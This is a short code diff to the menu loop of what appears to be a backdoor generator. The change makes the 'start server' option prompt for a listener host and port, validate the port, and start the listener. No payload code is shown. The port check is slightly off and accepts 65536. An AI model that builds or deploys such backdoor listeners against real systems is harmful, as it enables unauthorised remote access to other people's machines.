@@ -26,10 +26,22 @@ while True:
         utils.draw_main_menu()
         print("\n[+] - Backdoor was generated!\n")
     elif choice == '2':
-        start_server()
+        lhost = input("Type the listener host address >> ")
+        while True:
+            try:
+                lport = int(input("Type the listener port >> "))
+                if (lport > 65536 or lport == 0):
+                    print('[-] Unavailable port!')
+                else:
+                    break
+            except:
+                print("[-] Only numbers are accepted for the port!")
+            
+        start_server(lhost, lport)
+        break
     elif choice == '0':
         print("Good bye...")
-        exit(0)
+        break
     else:
         system("clear")
         utils.draw_main_menu()
